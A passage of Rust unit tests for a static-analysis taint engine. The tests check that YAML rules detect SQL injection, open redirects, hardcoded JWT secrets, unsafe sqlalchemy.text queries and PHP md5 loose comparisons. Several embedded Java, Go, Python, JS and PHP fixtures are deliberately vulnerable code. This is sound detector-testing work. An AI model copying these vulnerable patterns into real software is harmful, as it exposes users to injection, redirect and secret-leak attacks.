        // The `not`/`and`/`or` tier now compiles to a boolean `requires:` AST
        // instead of being skipped as an over-match risk.
        let rule = compiled(JAVA_NEGATION_RULE);
        assert!(
            rule.label_policy.is_some(),
            "an `INPUT and not CLEAN` rule must compile a LabelPolicy"
        );
    }

    #[test]
    fn taint_labels_java_negation_direct_fires() {
        use crate::engine::parser::parse_file;
        let rule = compiled(JAVA_NEGATION_RULE);
        // Tainted request read reaches the sink WITHOUT a concat: carries only
        // INPUT (never CLEAN), so `INPUT and not CLEAN` fires.
        let src = r#"
class C {
    void run(HttpServletRequest req, java.sql.Statement stmt) throws Exception {
        stmt.execute(req.getParameter("x"));
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java fixture parses");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "un-concatenated tainted input must fire (INPUT and not CLEAN), got {findings:?}"
        );
    }

    #[test]
    fn taint_labels_java_negation_concat_suppressed() {
        use crate::engine::parser::parse_file;
        let rule = compiled(JAVA_NEGATION_RULE);
        // The SAME tainted read flows through a `$X + $INPUT` concat first, so it
        // acquires CLEAN — `not CLEAN` must reject it. This is the discrimination
        // the negation tier exists for.
        let src = r#"
class C {
    void run(HttpServletRequest req, java.sql.Statement stmt) throws Exception {
        String q = "prefix" + req.getParameter("y");
        stmt.execute(q);
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java fixture parses");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a CLEAN-relabeled (concatenated) value must NOT fire (not CLEAN), got {findings:?}"
        );
    }

    #[test]
    fn unlabeled_taint_rule_has_no_label_policy() {
        // Backward-compat: a rule with no `label:`/`requires:` compiles with no
        // policy, so every existing engine path stays on the unlabeled behavior.
        let rule = compiled(
            r#"
id: plain
mode: taint
languages: [java]
severity: ERROR
message: m
pattern-sources:
  - pattern: (HttpServletRequest $REQ)
pattern-sinks:
  - pattern: (Statement $S).executeQuery(...)
"#,
        );
        assert!(
            rule.label_policy.is_none(),
            "an unlabeled rule must have no LabelPolicy"
        );
    }

    // ── Taint-labels negation tier — Go `INPUT and not CLEAN` ───────────────
    //
    // A faithful reduction of the registry `open-redirect` / `tainted-url-host`
    // shape: an `INPUT`-labeled source, a `CLEAN` relabel source
    // `requires: INPUT` (a string-building concat), and a
    // `requires: INPUT and not CLEAN` redirect sink. The HARD faithfulness gate:
    // input reaching the sink directly FIRES; the same input that went through
    // the CLEAN relabel (concatenated behind a fixed URL prefix) does NOT.

    const GO_OPEN_REDIRECT_RULE: &str = r#"
id: labels-go-open-redirect
mode: taint
languages: [go]
severity: WARNING
message: "open redirect"
metadata:
  cwe: "CWE-601"
pattern-sources:
  - pattern: getInput(...)
    label: INPUT
  - pattern: '"$U" + $X'
    label: CLEAN
    requires: INPUT
pattern-sinks:
  - pattern: redirect(...)
    requires: INPUT and not CLEAN
"#;

    #[test]
    fn taint_labels_go_negation_policy_compiles() {
        let rule = compiled(GO_OPEN_REDIRECT_RULE);
        let policy = rule
            .label_policy
            .as_ref()
            .expect("Go negation rule must compile a LabelPolicy");
        assert_eq!(policy.source_label, "INPUT");
        assert_eq!(policy.relabels.len(), 1);
        assert_eq!(policy.relabels[0].from, "INPUT");
        assert_eq!(policy.relabels[0].to, "CLEAN");
        // The sink `requires:` is the boolean `INPUT and not CLEAN`.
        use crate::rules::taint_engine::RequiresExpr;
        let mut only_input = std::collections::BTreeSet::new();
        only_input.insert("INPUT".to_string());
        assert!(policy.sink_requires.eval(&only_input), "INPUT alone fires");
        let mut input_clean = only_input.clone();
        input_clean.insert("CLEAN".to_string());
        assert!(
            !policy.sink_requires.eval(&input_clean),
            "INPUT+CLEAN is suppressed by `not CLEAN`"
        );
        assert!(matches!(policy.sink_requires, RequiresExpr::And(_, _)));
    }

    #[test]
    fn taint_labels_go_negation_direct_fires() {
        use crate::engine::parser::parse_file;
        let rule = compiled(GO_OPEN_REDIRECT_RULE);
        // Tainted input reaches the redirect sink directly: carries only INPUT
        // (never CLEAN), so `INPUT and not CLEAN` fires.
        let src = r#"
package main
func handler() {
    x := getInput()
    redirect(x)
}
"#;
        let tree = parse_file(src, Language::Go).expect("go fixture parses");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "un-sanitized tainted input into redirect must fire, got {findings:?}"
        );
    }

    #[test]
    fn taint_labels_go_negation_relabeled_suppressed() {
        use crate::engine::parser::parse_file;
        let rule = compiled(GO_OPEN_REDIRECT_RULE);
        // The SAME tainted input is concatenated behind a fixed URL prefix first,
        // acquiring CLEAN — `not CLEAN` must reject it. This is the negation-tier
        // discrimination: over-firing here would be the forbidden behavior.
        let src = r#"
package main
func handler() {
    x := getInput()
    u := "https://safe.example.com/" + x
    redirect(u)
}
"#;
        let tree = parse_file(src, Language::Go).expect("go fixture parses");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a CLEAN-relabeled (concatenated) value must NOT fire (not CLEAN), got {findings:?}"
        );
    }

    #[test]
    fn taint_labels_go_negation_inline_concat_suppressed() {
        use crate::engine::parser::parse_file;
        let rule = compiled(GO_OPEN_REDIRECT_RULE);
        // Inline concat at the sink (no intermediate variable) must also be
        // suppressed — the relabel is computed on the sink argument expression.
        let src = r#"
package main
func handler() {
    redirect("https://safe.example.com/" + getInput())
}
"#;
        let tree = parse_file(src, Language::Go).expect("go fixture parses");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "inline concat behind a URL prefix must NOT fire (not CLEAN), got {findings:?}"
        );
    }

    #[test]
    fn taint_labels_go_multiple_primary_labels_unsupported() {
        // The JS/TS `raw-html-format` shape (two distinct primary source labels)
        // is NOT modeled by the single-primary policy and must stay skipped.
        let yaml = r#"
id: labels-two-primaries
mode: taint
languages: [go]
severity: WARNING
message: m
pattern-sources:
  - pattern: express(...)
    label: EXPRESS
  - pattern: expressts(...)
    label: EXPRESSTS
pattern-sinks:
  - pattern: sink(...)
    requires: EXPRESS or EXPRESSTS
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        assert!(
            matches!(parse_taint_rule(&v), TaintRuleParse::Skip(_)),
            "two distinct primary labels must stay skipped, not over-match"
        );
    }

    // ── Go colon-syntax typed-metavariable-receiver source ──────────────────
    //
    // `($REQUEST : *http.Request).$ANYTHING` means "any field/method read off a
    // variable declared `*http.Request` is a source". These exercise the whole
    // `parse_taint_rule -> compiled() -> check()` path: the source must LOAD
    // (compile to a `TypedName`), FIRE when a value read off an
    // `*http.Request`-typed variable flows to a sink, and stay SILENT when the
    // variable is a different declared type (the faithfulness requirement — the
    // typed source must NOT broaden into "seed every parameter").

    const GO_TYPED_SOURCE_RULE: &str = r#"
id: go-typed-source
mode: taint
languages: [go]
severity: WARNING
message: "Untrusted *http.Request read reaches a redirect sink"
pattern-sources:
  - patterns:
      - pattern: |
          ($REQUEST : *http.Request).$ANYTHING
pattern-sinks:
  - pattern: http.Redirect($W, $REQ, $URL, ...)
"#;

    #[test]
    fn go_typed_metavar_source_compiles_to_typed_name() {
        let rule = compiled(GO_TYPED_SOURCE_RULE);
        assert!(
            rule.spec.sources.iter().any(|s| matches!(
                s,
                GenericMatcher::TypedName { type_name, .. } if type_name == "http.Request"
            )),
            "colon-typed source should compile to TypedName{{http.Request}}, got {:?}",
            rule.spec.sources
        );
    }

    #[test]
    fn go_typed_metavar_source_loads_and_fires() {
        use crate::engine::parser::parse_file;
        let rule = compiled(GO_TYPED_SOURCE_RULE);
        // A field/method read off the `*http.Request`-typed parameter `r`
        // (`r.URL.Query().Get(...)`) flows into the redirect sink.
        let src = r#"
package main
import "net/http"
func h(w http.ResponseWriter, r *http.Request) {
    http.Redirect(w, r, r.URL.Query().Get("u"), 302)
}
"#;
        let tree = parse_file(src, Language::Go).expect("go fixture parses");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "a read off an *http.Request-typed parameter reaching http.Redirect must fire, got {findings:?}"
        );
    }

    #[test]
    fn go_typed_metavar_source_discriminates_by_type() {
        use crate::engine::parser::parse_file;
        let rule = compiled(GO_TYPED_SOURCE_RULE);
        // Same flow SHAPE, but `r` is a different declared type — it must NOT be
        // seeded, so nothing untrusted reaches the sink.
        let src = r#"
package main
import "net/http"
type Other struct{}
func h(w http.ResponseWriter, r *Other) {
    http.Redirect(w, r, r.URL.Query().Get("u"), 302)
}
"#;
        let tree = parse_file(src, Language::Go).expect("go fixture parses");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a differently-typed parameter must not be seeded as a source, got {findings:?}"
        );
    }

    #[test]
    fn go_typed_metavar_source_non_pointer_type_fires() {
        use crate::engine::parser::parse_file;
        // The non-pointer `http.Request` annotation must match a `*http.Request`
        // parameter too (both normalize to `http.Request`).
        let rule = compiled(
            r#"
id: go-typed-source-value
mode: taint
languages: [go]
severity: WARNING
message: m
pattern-sources:
  - pattern: |
      ($REQUEST : http.Request).$ANYTHING
pattern-sinks:
  - pattern: http.Redirect($W, $REQ, $URL, ...)
"#,
        );
        let src = r#"
package main
import "net/http"
func h(w http.ResponseWriter, r *http.Request) {
    http.Redirect(w, r, r.Host, 302)
}
"#;
        let tree = parse_file(src, Language::Go).expect("go fixture parses");
        assert!(
            !rule.check(src, &tree).is_empty(),
            "an `http.Request` annotation must match a `*http.Request` variable"
        );
    }

    // ── Go negation-tier with the REAL typed source ─────────────────────────
    //
    // The `INPUT and not CLEAN` label algebra was already built; this verifies
    // it holds END-TO-END now that the `($REQUEST : *http.Request).$ANYTHING`
    // INPUT source actually seeds. Direct flow FIRES; the same value routed
    // through the `"$U" + $X` CLEAN relabel is SUPPRESSED.
    //
    // The sink takes ONLY the URL argument (`redirect($URL)`) so the
    // discrimination isolates the URL value's label set — passing the tainted
    // `r` itself as another argument would fire independently (that is what
    // `focus-metavariable: $URL` restricts in the real registry rule).
    const GO_TYPED_NEGATION_RULE: &str = r#"
id: go-typed-open-redirect
mode: taint
languages: [go]
severity: WARNING
message: "open redirect"
pattern-sources:
  - patterns:
      - pattern: |
          ($REQUEST : *http.Request).$ANYTHING
    label: INPUT
  - pattern: '"$U" + $X'
    label: CLEAN
    requires: INPUT
pattern-sinks:
  - pattern: redirect($URL)
    requires: INPUT and not CLEAN
"#;

    #[test]
    fn go_typed_negation_policy_compiles() {
        let rule = compiled(GO_TYPED_NEGATION_RULE);
        let policy = rule
            .label_policy
            .as_ref()
            .expect("typed-source negation rule must compile a LabelPolicy");
        assert_eq!(policy.source_label, "INPUT");
        // The INPUT source is the typed source.
        assert!(
            rule.spec.sources.iter().any(|s| matches!(
                s,
                GenericMatcher::TypedName { type_name, .. } if type_name == "http.Request"
            )),
            "the INPUT source must be the typed *http.Request source, got {:?}",
            rule.spec.sources
        );
    }

    #[test]
    fn go_typed_negation_direct_fires() {
        use crate::engine::parser::parse_file;
        let rule = compiled(GO_TYPED_NEGATION_RULE);
        let src = r#"
package main
import "net/http"
func h(w http.ResponseWriter, r *http.Request) {
    redirect(r.URL.Query().Get("u"))
}
"#;
        let tree = parse_file(src, Language::Go).expect("go fixture parses");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "un-sanitized *http.Request input into the redirect sink must fire (INPUT and not CLEAN), got {findings:?}"
        );
    }

    #[test]
    fn go_typed_negation_relabeled_suppressed() {
        use crate::engine::parser::parse_file;
        let rule = compiled(GO_TYPED_NEGATION_RULE);
        // The SAME typed-source read is concatenated behind a fixed URL prefix,
        // acquiring CLEAN — `not CLEAN` must reject it. Over-firing here is the
        // forbidden behavior the negation tier exists to prevent.
        let src = r#"
package main
import "net/http"
func h(w http.ResponseWriter, r *http.Request) {
    u := "https://safe.example.com/" + r.URL.Query().Get("u")
    redirect(u)
}
"#;
        let tree = parse_file(src, Language::Go).expect("go fixture parses");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a CLEAN-relabeled (concatenated) value must NOT fire (not CLEAN), got {findings:?}"
        );
    }

    // The REAL registry `open-redirect` sink shape fires on genuinely
    // vulnerable code: `http.Redirect($W, $REQ, $URL, ...)` with a tainted URL
    // read off the `*http.Request` parameter.
    #[test]
    fn go_real_open_redirect_shape_fires_on_tainted_url() {
        use crate::engine::parser::parse_file;
        let rule = compiled(
            r#"
id: go-real-open-redirect
mode: taint
languages: [go]
severity: WARNING
message: "open redirect"
pattern-sources:
  - patterns:
      - pattern: |
          ($REQUEST : *http.Request).$ANYTHING
    label: INPUT
  - pattern: '"$U" + $X'
    label: CLEAN
    requires: INPUT
pattern-sinks:
  - patterns:
      - pattern: http.Redirect($W, $REQ, $URL, ...)
      - focus-metavariable: $URL
    requires: INPUT and not CLEAN
"#,
        );
        let src = r#"
package main
import "net/http"
func h(w http.ResponseWriter, r *http.Request) {
    http.Redirect(w, r, r.URL.Query().Get("u"), 302)
}
"#;
        let tree = parse_file(src, Language::Go).expect("go fixture parses");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "tainted URL read off *http.Request into http.Redirect must fire, got {findings:?}"
        );
    }

    // ── String-literal-value taint sources (`pattern-sources: "..."`) ────────
    //
    // The hardcoded-secret family compiles the ellipsis-string source `"..."`
    // to a `LiteralString` matcher that seeds every string literal as tainted.
    // These tests exercise the FULL `parse_taint_rule` -> `check` path and both
    // directions of the discrimination: a hardcoded literal reaching the sink
    // fires; a non-literal (a variable read from the environment) is silent.

    #[test]
    fn ellipsis_string_source_compiles_to_literal_string() {
        let m = compile_pattern("\"...\"", MatcherRole::Source, Language::Python)
            .expect("bare `\"...\"` must compile to a source matcher");
        assert!(
            matches!(m, GenericMatcher::LiteralString { .. }),
            "bare ellipsis-string source must compile to LiteralString, got {m:?}"
        );
        // A string pattern carrying content is NOT the any-literal source — it
        // must not collapse into LiteralString (that would over-match).
        assert!(
            !matches!(
                compile_pattern("\"secret\"", MatcherRole::Source, Language::Python),
                Some(GenericMatcher::LiteralString { .. })
            ),
            "a content-carrying string pattern must not compile to LiteralString"
        );
        // Sink position: a bare literal has no data-flow node to bind.
        assert!(
            compile_pattern("\"...\"", MatcherRole::Sink, Language::Python).is_none(),
            "ellipsis-string in sink position must not compile"
        );
    }

    /// A synthetic hardcoded-JWT-secret rule (the `"..."`-source shape) LOADS
    /// through `parse_taint_rule` and FIRES when a hardcoded string literal
    /// reaches the `jwt.sign` sink — Python engine.
    #[test]
    fn literal_string_source_python_fires_on_hardcoded_secret() {
        use crate::engine::parser::parse_file;
        let rule = compiled(
            r#"
id: hardcoded-jwt-secret-py
mode: taint
languages: [python]
severity: WARNING
message: "hardcoded secret"
pattern-sources:
  - pattern: |
      "..."
pattern-sinks:
  - pattern: jwt.sign($PAYLOAD, $SECRET)
"#,
        );
        // Literal secret flows into the sink -> fires.
        let fire = r#"
import jwt
def make(payload):
    return jwt.sign(payload, "hardcoded-secret")
"#;
        let tree = parse_file(fire, Language::Python).expect("python fixture parses");
        assert_eq!(
            rule.check(fire, &tree).len(),
            1,
            "a hardcoded string literal reaching jwt.sign must fire"
        );
        // A non-literal secret (read from the environment) must be silent.
        let clean = r#"
import jwt, os
def make(payload):
    secret_from_env = os.environ["JWT_SECRET"]
    return jwt.sign(payload, secret_from_env)
"#;
        let tree = parse_file(clean, Language::Python).expect("python fixture parses");
        assert!(
            rule.check(clean, &tree).is_empty(),
            "a non-literal secret (os.environ read) must NOT fire"
        );
    }

    /// The same discrimination for the JavaScript engine: a hardcoded literal
    /// reaching `jwt.sign` fires; a variable read from `process.env` is silent.
    #[test]
    fn literal_string_source_js_fires_on_hardcoded_secret() {
        use crate::engine::parser::parse_file;
        let rule = compiled(
            r#"
id: hardcoded-jwt-secret-js
mode: taint
languages: [javascript, typescript]
severity: WARNING
message: "hardcoded secret"
pattern-sources:
  - pattern: |
      "..."
pattern-sinks:
  - pattern: jwt.sign($PAYLOAD, $SECRET)
"#,
        );
        let fire = r#"
const jwt = require("jsonwebtoken");
function make(payload) {
    return jwt.sign(payload, "hardcoded-secret");
}
"#;
        let tree = parse_file(fire, Language::JavaScript).expect("js fixture parses");
        assert_eq!(
            rule.check(fire, &tree).len(),
            1,
            "a hardcoded string literal reaching jwt.sign must fire"
        );
        let clean = r#"
const jwt = require("jsonwebtoken");
function make(payload) {
    const secretFromEnv = process.env.JWT_SECRET;
    return jwt.sign(payload, secretFromEnv);
}
"#;
        let tree = parse_file(clean, Language::JavaScript).expect("js fixture parses");
        assert!(
            rule.check(clean, &tree).is_empty(),
            "a non-literal secret (process.env read) must NOT fire"
        );
    }

    // ── String-literal-matching-regex SOURCE (the `requests` http:// family) ──
    //
    // The `"$URL"` + `metavariable-regex` source compiles to a
    // `LiteralString { regex: Some(..) }` that seeds ONLY string literals whose
    // text matches the constraint (`http://`, not localhost/127.0.0.1). These
    // tests exercise the full `parse_taint_rule -> check` path and the
    // faithfulness discrimination in BOTH directions.

    /// The source compiles to a regex-constrained `LiteralString`, not a bare
    /// any-literal one (which would over-seed every string).
    #[test]
    fn string_literal_regex_source_compiles_with_regex() {
        let r = compiled(
            r#"
id: req-http-src
mode: taint
languages: [python]
severity: INFO
message: m
pattern-sources:
  - patterns:
      - pattern: |
          "$URL"
      - metavariable-pattern:
          metavariable: $URL
          language: regex
          patterns:
            - pattern-regex: http://
            - pattern-not-regex: .*://localhost
            - pattern-not-regex: .*://127\.0\.0\.1
pattern-sinks:
  - patterns:
      - pattern-either:
          - pattern: requests.$W($SINK, ...)
          - pattern: requests.request($METHOD, $SINK, ...)
          - pattern: requests.Request($METHOD, $SINK, ...)
      - focus-metavariable: $SINK
"#,
        );
        let lit: Vec<&Option<String>> = r
            .spec
            .sources
            .iter()
            .filter_map(|m| match m {
                GenericMatcher::LiteralString { regex, .. } => Some(regex),
                _ => None,
            })
            .collect();
        assert_eq!(
            lit.len(),
            1,
            "one LiteralString source, got {:?}",
            r.spec.sources
        );
        assert!(
            lit[0].is_some(),
            "the requests http:// source must carry a regex constraint (not any-literal)"
        );
    }

    /// Full parse -> check: a hardcoded `http://` literal reaching the
    /// `requests.request` sink FIRES; an `https://` literal, a `localhost`
    /// literal, and a non-literal variable are all SILENT (regex enforced).
    #[test]
    fn string_literal_regex_source_python_discriminates() {
        use crate::engine::parser::parse_file;
        let rule = compiled(
            r#"
id: req-http
mode: taint
languages: [python]
severity: INFO
message: m
pattern-sources:
  - patterns:
      - pattern: |
          "$URL"
      - metavariable-pattern:
          metavariable: $URL
          language: regex
          patterns:
            - pattern-regex: http://
            - pattern-not-regex: .*://localhost
            - pattern-not-regex: .*://127\.0\.0\.1
pattern-sinks:
  - patterns:
      - pattern-either:
          - pattern: requests.$W($SINK, ...)
          - pattern: requests.request($METHOD, $SINK, ...)
          - pattern: requests.Request($METHOD, $SINK, ...)
      - focus-metavariable: $SINK
"#,
        );

        // FIRES: an `http://` literal reaches the sink.
        let fire = r#"
import requests
def go():
    requests.request("GET", "http://evil.example.com/api")
"#;
        let tree = parse_file(fire, Language::Python).expect("python fixture parses");
        assert_eq!(
            rule.check(fire, &tree).len(),
            1,
            "an http:// string literal reaching requests.request must fire"
        );

        // SILENT: `https://` literal does not match the `http://` regex.
        let https = r#"
import requests
def go():
    requests.request("GET", "https://safe.example.com/api")
"#;
        let tree = parse_file(https, Language::Python).expect("python fixture parses");
        assert!(
            rule.check(https, &tree).is_empty(),
            "an https:// literal must NOT be seeded"
        );

        // SILENT: `http://localhost` is excluded by the pattern-not-regex.
        let localhost = r#"
import requests
def go():
    requests.request("GET", "http://localhost:8080/api")
"#;
        let tree = parse_file(localhost, Language::Python).expect("python fixture parses");
        assert!(
            rule.check(localhost, &tree).is_empty(),
            "an http://localhost literal must NOT be seeded"
        );

        // SILENT: a non-literal (variable read from config) is never a literal
        // source, regardless of its runtime value.
        let nonliteral = r#"
import requests
def go(cfg):
    url = cfg.endpoint
    requests.request("GET", url)
"#;
        let tree = parse_file(nonliteral, Language::Python).expect("python fixture parses");
        assert!(
            rule.check(nonliteral, &tree).is_empty(),
            "a non-literal URL variable must NOT be seeded"
        );
    }

    /// The bare any-literal `"..."` source (regex: None) must behave IDENTICALLY
    /// to before this change — every string literal is still seeded, so the
    /// hardcoded-secret rule fires on ANY literal reaching the sink.
    #[test]
    fn bare_literal_string_source_still_seeds_any_literal() {
        use crate::engine::parser::parse_file;
        let rule = compiled(
            r#"
id: hardcoded-any-literal
mode: taint
languages: [python]
severity: WARNING
message: m
pattern-sources:
  - pattern: |
      "..."
pattern-sinks:
  - pattern: jwt.sign($PAYLOAD, $SECRET)
"#,
        );
        // A non-http literal (would fail the requests regex) still fires here,
        // proving regex: None preserves the any-literal behavior.
        let fire = r#"
import jwt
def make(payload):
    return jwt.sign(payload, "https://not-a-url-just-a-secret")
"#;
        let tree = parse_file(fire, Language::Python).expect("python fixture parses");
        assert_eq!(
            rule.check(fire, &tree).len(),
            1,
            "bare any-literal source must still seed any string literal"
        );
    }

    // ── Python string-construction SOURCE (`avoid-sqlalchemy-text`) ──────────
    //
    // The whole `parse_taint_rule -> compiled() -> check()` path: a dynamically
    // constructed string (concat / f-string / `.format` / `%`) flowing into
    // `sqlalchemy.text(...)` fires; a plain string literal or a bare variable
    // reaching `text(...)` stays silent (the faithfulness requirement — the
    // source is the CONSTRUCTION, not any value).

    /// The real registry `avoid-sqlalchemy-text` rule shape (five
    /// string-construction source alternatives + a `sqlalchemy.text(...)` sink).
    const AVOID_SQLALCHEMY_TEXT_RULE: &str = r#"
id: avoid-sqlalchemy-text
mode: taint
languages: [python]
severity: ERROR
message: "sqlalchemy.text is vulnerable to SQL injection"
pattern-sinks:
  - pattern: |
      sqlalchemy.text(...)
pattern-sources:
  - patterns:
      - pattern: |
          $X + $Y
      - metavariable-type:
          metavariable: $X
          type: string
  - patterns:
      - pattern: |
          $X + $Y
      - metavariable-type:
          metavariable: $Y
          type: string
  - patterns:
      - pattern: |
          f"..."
  - patterns:
      - pattern: |
          $X.format(...)
      - metavariable-type:
          metavariable: $X
          type: string
  - patterns:
      - pattern: |
          $X % $Y
      - metavariable-type:
          metavariable: $X
          type: string
"#;

    #[test]
    fn avoid_sqlalchemy_text_loads_with_construction_sources() {
        let rule = compiled(AVOID_SQLALCHEMY_TEXT_RULE);
        // The five source alternatives all compile to the `BinopFormat`
        // string-construction source (reused, no new NodeMatcher variant).
        let n_binop = rule
            .spec
            .sources
            .iter()
            .filter(|s| matches!(s, GenericMatcher::BinopFormat { .. }))
            .count();
        assert!(
            n_binop >= 4,
            "expected the string-construction sources to compile to BinopFormat, got {:?}",
            rule.spec.sources
        );
        assert!(
            rule.spec.sinks.iter().any(|s| matches!(
                s,
                GenericMatcher::Call { canonical, .. } if canonical == "sqlalchemy.text"
            )),
            "sink should compile to Call{{sqlalchemy.text}}, got {:?}",
            rule.spec.sinks
        );
    }

    #[test]
    fn avoid_sqlalchemy_text_fires_on_each_construction_shape() {
        use crate::engine::parser::parse_file;
        let rule = compiled(AVOID_SQLALCHEMY_TEXT_RULE);

        // Each `sqlalchemy.text(...)` call receives a value that is a constructed
        // string (via an intermediate variable — exercises assignment
        // propagation).
        let src = r#"
import sqlalchemy

def concat_prefix(param):
    s = "foo" + param
    return sqlalchemy.text(s)

def concat_suffix(param):
    s = param + "bar"
    return sqlalchemy.text(s)

def fstring(param):
    s = f"foo{param}bar"
    return sqlalchemy.text(s)

def dot_format(param):
    s = "foo{}bar".format(param)
    return sqlalchemy.text(s)

def percent(param):
    s = "foo %s bar" % param
    return sqlalchemy.text(s)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture parses");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            5,
            "each of the five constructed-string flows into text(...) must fire, got {findings:?}"
        );
    }

    #[test]
    fn avoid_sqlalchemy_text_fires_on_inline_construction() {
        use crate::engine::parser::parse_file;
        let rule = compiled(AVOID_SQLALCHEMY_TEXT_RULE);
        // Construction directly in the sink argument (no intermediate variable).
        let src = r#"
import sqlalchemy

def h(param):
    return sqlalchemy.text("SELECT * FROM t WHERE x = " + param)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture parses");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "an inline `\"...\" + param` construction reaching text(...) must fire, got {findings:?}"
        );
    }

    /// The realistic `from sqlalchemy import text` import — the bare `text(...)`
    /// callee only resolves to the `sqlalchemy.text` sink through the alias
    /// table, so this exercises the full aliased-sink path.
    #[test]
    fn avoid_sqlalchemy_text_fires_through_import_alias() {
        use crate::engine::parser::parse_file;
        use crate::rules::python_aliases::from_tree as py_aliases_from_tree;
        let rule = compiled(AVOID_SQLALCHEMY_TEXT_RULE);
        let src = r#"
from sqlalchemy import text

def h(param):
    s = "foo" + param
    return text(s)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture parses");
        let aliases = py_aliases_from_tree(src, &tree);
        let ctx = FileContext {
            python_aliases: Some(&aliases),
            ..FileContext::default()
        };
        let findings = rule.check_with_context(src, &tree, &ctx);
        assert_eq!(
            findings.len(),
            1,
            "a constructed string into `text(...)` (imported from sqlalchemy) must fire, got {findings:?}"
        );
    }

    /// Faithfulness near-miss: a PLAIN string literal or a BARE variable reaching
    /// `text(...)` must NOT fire — the source is the CONSTRUCTION, not any value
    /// (over-firing here would be the forbidden broadening).
    #[test]
    fn avoid_sqlalchemy_text_silent_on_plain_literal_and_bare_var() {
        use crate::engine::parser::parse_file;
        let rule = compiled(AVOID_SQLALCHEMY_TEXT_RULE);
        let src = r#"
import sqlalchemy

def plain_literal():
    s = "SELECT 1"
    return sqlalchemy.text(s)

def plain_inline():
    return sqlalchemy.text("SELECT 1")

def bare_var(param):
    # `param` is not a constructed string — not seeded by this rule.
    return sqlalchemy.text(param)

def numeric(a, b):
    n = a + b
    return sqlalchemy.text(n)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture parses");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "plain literals / bare variables / numeric sums reaching text(...) must NOT fire, got {findings:?}"
        );
    }

    // ── PHP loose-equality comparison sink (`md5-loose-equality`) ────────────
    //
    // These exercise the full `parse_taint_rule` -> `compiled()` -> `check()`
    // path for the `LooseEquality` sink primitive. The HARD faithfulness gate is
    // the loose-vs-strict discrimination: a hash-family source reaching a LOOSE
    // `==`/`!=` fires, but the SAME source reaching a STRICT `===`/`!==` (the
    // safe form the rule recommends) must NOT — firing on strict comparison
    // would be the over-match the rule exists to avoid.

    const MD5_LOOSE_RULE: &str = r#"
id: md5-loose-equality
mode: taint
languages: [php]
severity: ERROR
message: "Make sure comparisons involving md5 values are strict"
pattern-sinks:
  - pattern: $VAR1 == $VAR2
  - pattern: $VAR1 != $VAR2
pattern-sources:
  - pattern: md5(...)
  - pattern: hash(...)
  - pattern: sha1(...)
pattern-sanitizers:
  - pattern: strlen(...)
"#;

    #[test]
    fn md5_loose_equality_loads() {
        // Must compile to a live rule with a LooseEquality sink.
        let rule = compiled(MD5_LOOSE_RULE);
        assert!(
            rule.spec
                .sinks
                .iter()
                .any(|s| matches!(s, GenericMatcher::LooseEquality { .. })),
            "expected a LooseEquality sink, got {:?}",
            rule.spec.sinks
        );
    }

    #[test]
    fn md5_loose_equality_loose_comparison_fires() {
        use crate::engine::parser::parse_file;
        let rule = compiled(MD5_LOOSE_RULE);
        // A hash-family value flowing into a LOOSE `==` comparison fires.
        let src = "<?php\nfunction f($u){\n  $h = md5($u);\n  if ($h == $u) { return 1; }\n}\n";
        let tree = parse_file(src, Language::Php).expect("php fixture parses");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "md5 value in a loose `==` comparison must fire, got {findings:?}"
        );
    }

    #[test]
    fn md5_loose_equality_direct_source_at_sink_fires() {
        use crate::engine::parser::parse_file;
        let rule = compiled(MD5_LOOSE_RULE);
        // The source expression can appear inline in the comparison.
        let src = "<?php\nfunction f($u){\n  if (md5($u) == \"0\") { return 1; }\n}\n";
        let tree = parse_file(src, Language::Php).expect("php fixture parses");
        assert_eq!(rule.check(src, &tree).len(), 1);
    }

    #[test]
    fn md5_loose_equality_strict_comparison_stays_clean() {
        use crate::engine::parser::parse_file;
        let rule = compiled(MD5_LOOSE_RULE);
        // The SAME md5 value in a STRICT `===` comparison must NOT fire — this
        // is the whole point of the rule and the faithfulness gate.
        let src = "<?php\nfunction f($u){\n  $h = md5($u);\n  if ($h === $u) { return 1; }\n}\n";
        let tree = parse_file(src, Language::Php).expect("php fixture parses");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "strict `===` comparison must NOT fire (safe form the rule recommends), got {findings:?}"
        );
    }

    #[test]
    fn md5_loose_equality_untainted_comparison_stays_clean() {
        use crate::engine::parser::parse_file;
        let rule = compiled(MD5_LOOSE_RULE);
        // A loose comparison of two untainted values is not a finding.
        let src = "<?php\nfunction f($a,$b){\n  if ($a == $b) { return 1; }\n}\n";
        let tree = parse_file(src, Language::Php).expect("php fixture parses");
        assert!(
            rule.check(src, &tree).is_empty(),
            "untainted `==` comparison must NOT fire"
        );
    }

    #[test]
    fn md5_loose_equality_sanitized_operand_stays_clean() {
        use crate::engine::parser::parse_file;
        let rule = compiled(MD5_LOOSE_RULE);
        // `strlen(...)` sanitizes the hash before the comparison → no finding.
        let src =
            "<?php\nfunction f($u){\n  $h = md5($u);\n  if (strlen($h) == $u) { return 1; }\n}\n";
        let tree = parse_file(src, Language::Php).expect("php fixture parses");
        assert!(
            rule.check(src, &tree).is_empty(),
            "strlen-sanitized operand must NOT fire"
        );
    }

    #[test]
    fn loose_equality_not_a_source_shape() {
        // A comparison is a destination, never a taint origin — the pattern must
        // not compile as a SOURCE.
        assert!(compile_pattern("$A == $B", MatcherRole::Source, Language::Php).is_none());
